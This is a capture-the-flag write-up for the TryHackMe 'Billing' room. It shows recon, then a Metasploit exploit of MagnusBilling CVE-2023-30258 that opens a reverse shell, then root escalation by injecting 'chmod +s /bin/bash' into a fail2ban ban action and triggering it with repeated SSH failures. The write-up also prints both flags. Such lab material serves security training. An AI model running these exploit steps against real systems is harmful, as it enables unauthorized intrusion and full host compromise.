# TryHackMe - Billing Write-Up

**Category:** Web Exploitation / Privilege Escalation

---

## Overview

Discovered a MagnusBilling instance on port 80, found a known unauthenticated RCE exploit for it, and used it to land an initial shell. From there, located the user flag in the magnus home directory. Escalated to root by abusing fail2ban's ability to execute scripts as root, injecting a payload and triggering it through failed SSH attempts.

---

## Reconnaissance

### Nmap Scan

First I ran an nmap scan, scanning all ports, with basic NSE scripts and an aggressive scan.

```bash
nmap -sV -sC -A -T4 billing.thm
```

<img width="975" height="682" alt="image" src="https://github.com/user-attachments/assets/c0d5589e-d57c-4580-b277-5352aba4be0c" />

The scan returned several open ports. Port 22 running OpenSSH 9.2p1, port 80 running Apache 2.4.62, port 3306 running MariaDB (unauthorized), and port 5038 running Asterisk Call Manager 2.10.6. The HTTP title pointed to `MagnusBilling` and the robots.txt disallowed entry was `/mbilling/`, which is worth noting for later. OS fingerprinting confirmed a Linux kernel host.

---

### Web Enumeration

Next I visited the webpage and navigated to the disallowed entry `/mbilling/` which revealed an auth portal. I ran `whatweb` to enumerate tech stacks and `gobuster` for further directory brute forcing.

```bash
whatweb http://billing.thm/mbilling/
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://billing.thm -t 25
```

<img width="975" height="301" alt="image" src="https://github.com/user-attachments/assets/e7618136-8ad0-41fb-8f14-663f03af243c" />

Gobuster returned `.htaccess`, `.htpasswd`, and `robots.txt`, all either 403 or 200. Nothing significant beyond what we already knew. I also tested the auth portal to see how it handled failed login attempts.

<img width="723" height="367" alt="image" src="https://github.com/user-attachments/assets/00c32b08-4b7a-48ba-8ce5-2332becdf20f" />

After three failed attempts the portal blocked my IP for five minutes. Noted, brute forcing this directly isn't viable without rotating IPs.

---

## Initial Foothold

### Searchsploit - Unauthenticated RCE

Rather than attacking the login portal, I ran searchsploit against MagnusBilling and found a known unauthenticated RCE CVE.

```bash
searchsploit magnusbilling
```

This is CVE-2023-30258, an unauthenticated remote code execution vulnerability in MagnusBilling. I loaded the Metasploit module and configured my options.

```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.65.171.42
set LHOST 192.168.206.16
run
```

<img width="975" height="525" alt="image" src="https://github.com/user-attachments/assets/1b853137-548f-4beb-8aaa-66180d9dfba9" />

The exploit confirmed command injection was possible, executed a PHP reverse TCP payload, and opened a Meterpreter session as `asterisk`. There wasn't much to work with directly in Meterpreter so I upgraded to a proper shell using Python's PTY module.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

We're now in a stable bash shell as `asterisk`.

---

## Flag Capture

### User Flag

First thing I looked for was the user flag. The `find` command gave me a direct path.

```bash
find / -name "user.txt" 2>/dev/null
# /home/magnus/user.txt
```

<img width="975" height="63" alt="image" src="https://github.com/user-attachments/assets/3a0c911f-3435-4e74-94b8-0bee22551759" />

I backtracked from the deep webroot directory to `/var/www` and noticed a `tmpmagnus` directory with full read/write permissions for everyone. From there I was able to cat out the user flag directly.

```bash
cd /var/www/tmpmagnus
cat /home/magnus/user.txt
```

<img width="975" height="811" alt="image" src="https://github.com/user-attachments/assets/e7153a1d-6606-465b-9dea-7ff276f212dc" />

**User Flag:** `THM{4a6831d5f124b25eefb1e92e0f0da4ca}`

---

### Journey2Root

For root I needed to escalate privileges. I started enumerating and noticed `fail2ban` was running. Fail2ban is a security tool that bans IP addresses after a certain number of failed login attempts; but more importantly, it runs as root and executes action scripts when banning IPs. If you can write to those action files, code runs as root.

```bash
ls -al | grep fail
```

<img width="975" height="200" alt="image" src="https://github.com/user-attachments/assets/cb4c0ec4-2199-400e-ac5a-e52321b97ade" />

I used `fail2ban-client` to enumerate the active jails and found the `sshd` jail was configured with the `iptables-multiport` action. This is the action that triggers on failed SSH login attempts; our privilege escalation vector.

```bash
sudo fail2ban-client get sshd actions
# iptables-multiport
```

<img width="974" height="111" alt="image" src="https://github.com/user-attachments/assets/7dc306bd-d4ed-49b0-af88-a4a41a3dcc0c" />

Checking permissions on the action config showed read-only access, so I couldn't edit the file directly. Instead I used `fail2ban-client` to inject a malicious `actionban` payload that would run when an IP got banned; specifically, setting the SUID bit on bash to give us a root shell.

```bash
sudo fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
```

<img width="975" height="173" alt="image" src="https://github.com/user-attachments/assets/248a7d19-0c65-4b74-9b86-5075fbffd6b6" />

With the payload set, I triggered the ban from my attacker machine by spamming SSH login attempts with an invalid user.

```bash
for i in {1..10}; do ssh invaliduser@10.65.171.42; done
```

<img width="975" height="443" alt="image" src="https://github.com/user-attachments/assets/cfbcf2f5-082c-47de-8f90-a4eb9557f898" />

After the ban triggered and fail2ban executed the action as root, I confirmed the SUID bit was set on bash, then dropped into a root shell.

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1265648 Apr 18 2025 /bin/bash
/bin/bash -p
bash-5.2# cat /root/root.txt
```

<img width="758" height="248" alt="image" src="https://github.com/user-attachments/assets/ff31a820-5f43-4837-8690-3c1abaf4b6f1" />

**Root Flag:** `THM{33ad5b530e71a172648f424ec23fae60}`


## Challenge Completed!!!
